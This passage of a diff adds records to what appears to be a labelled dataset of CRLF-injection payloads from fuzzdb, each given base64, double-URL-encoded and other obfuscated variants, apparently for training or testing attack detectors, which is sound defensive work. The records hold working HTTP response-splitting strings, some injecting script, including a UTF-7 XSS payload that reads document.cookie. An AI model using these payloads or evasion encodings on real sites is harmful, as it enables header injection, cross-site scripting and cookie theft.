+    "source": "Generated:raw_logi_00019",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "8f38d82f8a6af81ae978e6913094997a39a2bf529a2bedff675cc847b4c60abc",
+    "original_id": "raw_logi_00019",
+    "original_payload": "r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>",
+    "obfuscated_payload": "ciUwZCUwYUNvbnRlbnRMZW5ndGg6JTIwMCUwZCUwYSUwZCUwYUhUVFAvMS4xJTIwMjAwJTIwT0slMGQlMGFDb250ZW50VHlwZTolMjB0ZXh0L2h0bWwlMGQlMGFDb250ZW50TGVuZ3RoOiUyMDE5JTBkJTBhJTBkJTBhPGh0bWw-SW5qZWN0ZWQlMDJDb250ZW50PC9odG1sPg",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 92564898,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00019__obf03",
+    "payload": "r\\r\\nContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0AContentType:%20text/html%0D%0AContentLength:%2019%0D%0a%0D%0a<html>Injected%02Content</html>",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00019",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "8f38d82f8a6af81ae978e6913094997a39a2bf529a2bedff675cc847b4c60abc",
+    "original_id": "raw_logi_00019",
+    "original_payload": "r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>",
+    "obfuscated_payload": "r\\r\\nContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0AContentType:%20text/html%0D%0AContentLength:%2019%0D%0a%0D%0a<html>Injected%02Content</html>",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 92565907,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00019__obf04",
+    "payload": "r%255Cr%255CnContentLength%253A%2525200%25250d%25250a%25250d%25250aHTTP%252F1.1%252520200%252520OK%25250d%25250aContentType%253A%252520text%252Fhtml%25250d%25250aContentLength%253A%25252019%25250d%25250a%25250d%25250a%253Chtml%253EInjected%252502Content%253C%252Fhtml%253E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00019",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "8f38d82f8a6af81ae978e6913094997a39a2bf529a2bedff675cc847b4c60abc",
+    "original_id": "raw_logi_00019",
+    "original_payload": "r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>",
+    "obfuscated_payload": "r%255Cr%255CnContentLength%253A%2525200%25250d%25250a%25250d%25250aHTTP%252F1.1%252520200%252520OK%25250d%25250aContentType%253A%252520text%252Fhtml%25250d%25250aContentLength%253A%25252019%25250d%25250a%25250d%25250a%253Chtml%253EInjected%252502Content%253C%252Fhtml%253E",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 92566916,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00020__obf01",
+    "payload": "%250d%250d%250a%250a",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00020",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "4b5a8bc939fb9698ad088dd811c219e4e20058ffb1f4f8aaded853bc877b3a06",
+    "original_id": "raw_logi_00020",
+    "original_payload": "%0d%0d%0a%0a",
+    "obfuscated_payload": "%250d%250d%250a%250a",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92663892,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00020__obf02",
+    "payload": "JTBkJTBkJTBhJTBh",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00020",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "4b5a8bc939fb9698ad088dd811c219e4e20058ffb1f4f8aaded853bc877b3a06",
+    "original_id": "raw_logi_00020",
+    "original_payload": "%0d%0d%0a%0a",
+    "obfuscated_payload": "JTBkJTBkJTBhJTBh",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 92664901,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00020__obf03",
+    "payload": "%0D%0D%0a%0A",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00020",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "4b5a8bc939fb9698ad088dd811c219e4e20058ffb1f4f8aaded853bc877b3a06",
+    "original_id": "raw_logi_00020",
+    "original_payload": "%0d%0d%0a%0a",
+    "obfuscated_payload": "%0D%0D%0a%0A",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92665910,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00020__obf04",
+    "payload": "JTBkJTBEJTBBJTBB",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00020",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "4b5a8bc939fb9698ad088dd811c219e4e20058ffb1f4f8aaded853bc877b3a06",
+    "original_id": "raw_logi_00020",
+    "original_payload": "%0d%0d%0a%0a",
+    "obfuscated_payload": "JTBkJTBEJTBBJTBB",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 92666919,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00021__obf01",
+    "payload": "%5Cr%5Cn",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00021",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "ce318ab44926f2cb39e0a7a9c0877943b11733ab8e611cbb170feef1a3d5c549",
+    "original_id": "raw_logi_00021",
+    "original_payload": "\\r\\n",
+    "obfuscated_payload": "%5Cr%5Cn",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92763895,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00021__obf02",
+    "payload": "XHJcbg==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00021",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "ce318ab44926f2cb39e0a7a9c0877943b11733ab8e611cbb170feef1a3d5c549",
+    "original_id": "raw_logi_00021",
+    "original_payload": "\\r\\n",
+    "obfuscated_payload": "XHJcbg==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 92764904,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00021__obf03",
+    "payload": "\\u005cr\\n",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00021",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "ce318ab44926f2cb39e0a7a9c0877943b11733ab8e611cbb170feef1a3d5c549",
+    "original_id": "raw_logi_00021",
+    "original_payload": "\\r\\n",
+    "obfuscated_payload": "\\u005cr\\n",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 92765913,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00021__obf04",
+    "payload": "%5Cr\\n",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00021",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "ce318ab44926f2cb39e0a7a9c0877943b11733ab8e611cbb170feef1a3d5c549",
+    "original_id": "raw_logi_00021",
+    "original_payload": "\\r\\n",
+    "obfuscated_payload": "%5Cr\\n",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92766922,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00022__obf01",
+    "payload": "%0%0d%250ad%250%250d%0aa",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00022",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "b0b2da7914db1519528c02874b9fba8040c9f7b94cf294a813125360c984e211",
+    "original_id": "raw_logi_00022",
+    "original_payload": "%0%0d%0ad%0%0d%0aa",
+    "obfuscated_payload": "%0%0d%250ad%250%250d%0aa",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92863898,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00022__obf02",
+    "payload": "JTAlMGQlMGFkJTAlMGQlMGFh",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00022",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "b0b2da7914db1519528c02874b9fba8040c9f7b94cf294a813125360c984e211",
+    "original_id": "raw_logi_00022",
+    "original_payload": "%0%0d%0ad%0%0d%0aa",
+    "obfuscated_payload": "JTAlMGQlMGFkJTAlMGQlMGFh",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 92864907,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00022__obf03",
+    "payload": "%0\\r\\nd%0%0D%0aa",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00022",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "b0b2da7914db1519528c02874b9fba8040c9f7b94cf294a813125360c984e211",
+    "original_id": "raw_logi_00022",
+    "original_payload": "%0%0d%0ad%0%0d%0aa",
+    "obfuscated_payload": "%0\\r\\nd%0%0D%0aa",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92865916,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00022__obf04",
+    "payload": "%0%250D%250ad%250%250d%250aa",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00022",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "b0b2da7914db1519528c02874b9fba8040c9f7b94cf294a813125360c984e211",
+    "original_id": "raw_logi_00022",
+    "original_payload": "%0%0d%0ad%0%0d%0aa",
+    "obfuscated_payload": "%0%250D%250ad%250%250d%250aa",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92866925,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00023__obf01",
+    "payload": "%250%250D%250AD%250%250D%250AA",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00023",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "1443c7a5d501e42fb798809047cf37e710138911fa52f5254aae6aea0608b0df",
+    "original_id": "raw_logi_00023",
+    "original_payload": "%0%0D%0AD%0%0D%0AA",
+    "obfuscated_payload": "%250%250D%250AD%250%250D%250AA",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92963901,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00023__obf02",
+    "payload": "JTAlMEQlMEFEJTAlMEQlMEFB",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00023",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "1443c7a5d501e42fb798809047cf37e710138911fa52f5254aae6aea0608b0df",
+    "original_id": "raw_logi_00023",
+    "original_payload": "%0%0D%0AD%0%0D%0AA",
+    "obfuscated_payload": "JTAlMEQlMEFEJTAlMEQlMEFB",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 92964910,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00023__obf03",
+    "payload": "%0\\r\\nD%0%0D%0aA",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00023",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "1443c7a5d501e42fb798809047cf37e710138911fa52f5254aae6aea0608b0df",
+    "original_id": "raw_logi_00023",
+    "original_payload": "%0%0D%0AD%0%0D%0AA",
+    "obfuscated_payload": "%0\\r\\nD%0%0D%0aA",
+    "obfuscation_chain": [
+      "log_json_newline",
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92965919,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00023__obf04",
+    "payload": "%0%0d%0%61D%%30%0d%%30A%41",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00023",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "1443c7a5d501e42fb798809047cf37e710138911fa52f5254aae6aea0608b0df",
+    "original_id": "raw_logi_00023",
+    "original_payload": "%0%0D%0AD%0%0D%0AA",
+    "obfuscated_payload": "%0%0d%0%61D%%30%0d%%30A%41",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 92966928,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00024__obf01",
+    "payload": "%250d%250aContentType%3A%2520text%2Fhtml%3Bcharset%3DUTF-7%250d%250aContent-Length%3A%2520129%250d%250a%250d%250a%252BADw-html%252BAD4-%252BADw-body%252BAD4-%252BADw-script%252BAD4-alert%2528%2527XSS%2Ccookies%3A%2527%252Bdocument.cookie%2529%252BADw-%2Fscript%252BAD4-%252BADw-%2Fbody%252BAD4-%252BADw-%2Fhtml%252BAD4",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00024",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "726e7eb921a005c0eeb46036803d96942c6e7f03a15f1f25723d9668394dd49e",
+    "original_id": "raw_logi_00024",
+    "original_payload": "%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4",
+    "obfuscated_payload": "%250d%250aContentType%3A%2520text%2Fhtml%3Bcharset%3DUTF-7%250d%250aContent-Length%3A%2520129%250d%250a%250d%250a%252BADw-html%252BAD4-%252BADw-body%252BAD4-%252BADw-script%252BAD4-alert%2528%2527XSS%2Ccookies%3A%2527%252Bdocument.cookie%2529%252BADw-%2Fscript%252BAD4-%252BADw-%2Fbody%252BAD4-%252BADw-%2Fhtml%252BAD4",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 93063904,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00024__obf02",
+    "payload": "JTBkJTBhQ29udGVudFR5cGU6JTIwdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTclMGQlMGFDb250ZW50LUxlbmd0aDolMjAxMjklMGQlMGElMGQlMGElMkJBRHctaHRtbCUyQkFENC0lMkJBRHctYm9keSUyQkFENC0lMkJBRHctc2NyaXB0JTJCQUQ0LWFsZXJ0JTI4JTI3WFNTLGNvb2tpZXM6JTI3JTJCZG9jdW1lbnQuY29va2llJTI5JTJCQUR3LS9zY3JpcHQlMkJBRDQtJTJCQUR3LS9ib2R5JTJCQUQ0LSUyQkFEdy0vaHRtbCUyQkFENA==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00024",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "726e7eb921a005c0eeb46036803d96942c6e7f03a15f1f25723d9668394dd49e",
+    "original_id": "raw_logi_00024",
+    "original_payload": "%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4",
+    "obfuscated_payload": "JTBkJTBhQ29udGVudFR5cGU6JTIwdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTclMGQlMGFDb250ZW50LUxlbmd0aDolMjAxMjklMGQlMGElMGQlMGElMkJBRHctaHRtbCUyQkFENC0lMkJBRHctYm9keSUyQkFENC0lMkJBRHctc2NyaXB0JTJCQUQ0LWFsZXJ0JTI4JTI3WFNTLGNvb2tpZXM6JTI3JTJCZG9jdW1lbnQuY29va2llJTI5JTJCQUR3LS9zY3JpcHQlMkJBRDQtJTJCQUR3LS9ib2R5JTJCQUQ0LSUyQkFEdy0vaHRtbCUyQkFENA==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 93064913,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00024__obf03",
+    "payload": "\\r\\nContentType:%20text/html;charset=UTF-7%0d%0AContent-Length:%20129%0d%0A%0d%0A%2bADw-html%2bAD4-%2bADw-body%2bAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2bADw-/script%2BAD4-%2bADw-/body%2bAD4-%2BADw-/html%2BAD4",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00024",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "726e7eb921a005c0eeb46036803d96942c6e7f03a15f1f25723d9668394dd49e",
+    "original_id": "raw_logi_00024",
+    "original_payload": "%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4",
+    "obfuscated_payload": "\\r\\nContentType:%20text/html;charset=UTF-7%0d%0AContent-Length:%20129%0d%0A%0d%0A%2bADw-html%2bAD4-%2bADw-body%2bAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2bADw-/script%2BAD4-%2bADw-/body%2bAD4-%2BADw-/html%2BAD4",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 93065922,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00024__obf04",
+    "payload": "JTBkJTBhQ29udGVudFR5cGU6JTIwdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTclMGQlMEFDb250ZW50LUxlbmd0aDolMjAxMjklMGQlMEElMEQlMEElMmJBRHctaHRtbCUyYkFENC0lMkJBRHctYm9keSUyYkFENC0lMkJBRHctc2NyaXB0JTJCQUQ0LWFsZXJ0JTI4JTI3WFNTLGNvb2tpZXM6JTI3JTJCZG9jdW1lbnQuY29va2llJTI5JTJiQUR3LS9zY3JpcHQlMkJBRDQtJTJiQUR3LS9ib2R5JTJCQUQ0LSUyQkFEdy0vaHRtbCUyYkFENA==",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00024",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "726e7eb921a005c0eeb46036803d96942c6e7f03a15f1f25723d9668394dd49e",
+    "original_id": "raw_logi_00024",
+    "original_payload": "%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4",
+    "obfuscated_payload": "JTBkJTBhQ29udGVudFR5cGU6JTIwdGV4dC9odG1sO2NoYXJzZXQ9VVRGLTclMGQlMEFDb250ZW50LUxlbmd0aDolMjAxMjklMGQlMEElMEQlMEElMmJBRHctaHRtbCUyYkFENC0lMkJBRHctYm9keSUyYkFENC0lMkJBRHctc2NyaXB0JTJCQUQ0LWFsZXJ0JTI4JTI3WFNTLGNvb2tpZXM6JTI3JTJCZG9jdW1lbnQuY29va2llJTI5JTJiQUR3LS9zY3JpcHQlMkJBRDQtJTJiQUR3LS9ib2R5JTJCQUQ0LSUyQkFEdy0vaHRtbCUyYkFENA==",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 93066931,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00025__obf01",
+    "payload": "%250AContent-Type%3Ahtml%250A%250A%253Cscript%253Ealert%28%2522XSS%2522%29%253C%2Fscript%253E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00025",
+    "source_url": "https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/http-protocol/crlf-injection.txt",
+    "source_path": "attack/http-protocol/crlf-injection.txt",
+    "source_version": "master-snapshot-2026-07-11",
+    "payload_sha256": "e5d4f4fc09f7ad8443db00470b2b5b52e07907665aaf66796d6595be8de2adb3",
+    "original_id": "raw_logi_00025",
+    "original_payload": "%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
